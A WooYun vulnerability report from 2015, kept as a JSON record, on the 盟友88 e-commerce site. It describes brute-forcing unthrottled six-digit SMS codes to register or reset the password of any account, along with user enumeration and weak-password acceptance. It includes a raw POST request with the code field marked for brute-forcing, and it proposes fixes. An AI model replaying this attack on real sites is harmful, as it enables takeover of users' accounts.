{"id": 39483, "wybug_id": "wooyun-2015-093932", "wybug_title": "盟友88电商平台任意用户注册与任意用户密码重置漏洞打包", "wybug_corp": "盟友88", "wybug_author": "sm0nk", "wybug_date": "2015-01-26 00:07", "wybug_open_date": "2015-03-12 00:08", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "18", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["设计缺陷", "认证设计不合理"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-01-26：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2015-03-12：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 盟友88是一家集商铺推广与生活消费为一体的综合性网站。其主要业务跨越B2B（business to business，商家对商家）、B2C（Business-to-Consumer商家对消费者）两大部分。客服人员说郑州已经开始正常运营了。。。业务逻辑设计缺陷导致1.任意用户注册2.任意用户密码重置3.批量检测用户是否存在4.弱口令密码检测（123456） 详细说明：  1.任意用户注册测试帐号1888888888818899999999http://passport.mengyou88.com/register由于注册的手机验证码是6位数字，并且没有时间和次数锁定，所以可以对vcode进行暴力破解，从100000到999999依次遍历，百分百能够得到验证码。\nPOST /register HTTP/1.1Host: passport.mengyou88.comUser-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:32.0) Gecko/20100101 Firefox/32.0Accept: */*Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateDNT: 1Content-Type: application/x-www-form-urlencoded; charset=UTF-8X-Requested-With: XMLHttpRequestReferer: http://passport.mengyou88.com/registerContent-Length: 47Cookie: ASP.NET_SessionId=vv2tttqsqimw0dktll5ot235; Bianligou_CheckKey=086869CB8AF5FCACA7666518DCF50894; Bianligou_SCID=0; Bianligou_SCNUM=0; Bianligou_SCKEY=51992A6D13D023F91D3167E977D1B6D4Connection: keep-alivePragma: no-cacheCache-Control: no-cachemobile=18888888888&passwd=test1234&vcode=111111\n六位数字短信验证码\n\n18899999999手机帐号注册\n\n测试帐号18888888888、18899999999 登录密码均为test1234\n\n\n\n2.任意用户密码重置漏洞http://passport.mengyou88.com/getpass\n\n\n\n同理，爆破六位数字短信验证码\n\n\n\n第四步虽然显示抱歉，处理您的请求时出错。但是已经可以使用新密码就行登录了。。。已经可以用wooyun这个密码进行登录了，如图\n\n3.批量检测用户是否存在找回密码处，没有对每个账户的唯一性以及验证码校验导致遍历用户是否存在\n\n\n\n4.弱口令检测，存在暴力破解用户命的风险可以用123456密码正常注册且登录\n\n\n\n   漏洞证明：  见详细说明\nPOST /register HTTP/1.1Host: passport.mengyou88.comUser-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:32.0) Gecko/20100101 Firefox/32.0Accept: */*Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateDNT: 1Content-Type: application/x-www-form-urlencoded; charset=UTF-8X-Requested-With: XMLHttpRequestReferer: http://passport.mengyou88.com/registerContent-Length: 47Cookie: ASP.NET_SessionId=vv2tttqsqimw0dktll5ot235; Bianligou_CheckKey=086869CB8AF5FCACA7666518DCF50894; Bianligou_SCID=0; Bianligou_SCNUM=0; Bianligou_SCKEY=51992A6D13D023F91D3167E977D1B6D4Connection: keep-alivePragma: no-cacheCache-Control: no-cachemobile=18888888888&passwd=test1234&vcode=$111111$\n\n\n\n\n   修复方案：  针对任意用户注册&密码重置漏洞&批量检测用户存在否解决方法如下：a.增加验证码，使之登录失败一次，验证码变换一次。b.同一用户如果10分钟内登录失败6次，禁用此用户登录2小时。针对弱口令a.增强开发人员的安全意识b.注册用户时，就避免存在123456这样的弱口令（满足密码复杂度要求）建议SDL的同时关注以下：a.用户的输入合法否b.业务数据篡改c.身份认证（平行权限与垂直权限等）d.验证码安全机制e.安全接口调用等f.代码审计（函数、变量etc）。。。如果电商模式成熟建议学习阿里京东等备建自己的安全团队，电商平台业务数据和用户数据至关重要。   版权声明：转载请注明来源 sm0nk@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n     2015-05-08 10:09 |    \t\tLoveSnow \t\t\t( 路人 |\t\t\t        Rank:9 漏洞数:3        | 以正和，以奇胜！)\t\t \n  我一定要关注你，你太实惠了，一会就是个实在人，哈哈！    \n     2015-05-08 10:51 |    \t\tsm0nk \t\t\t( 普通白帽子  |\t\t\t        Rank:163 漏洞数:30        | all is well)\t\t \n  @LoveSnow 微博私聊    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}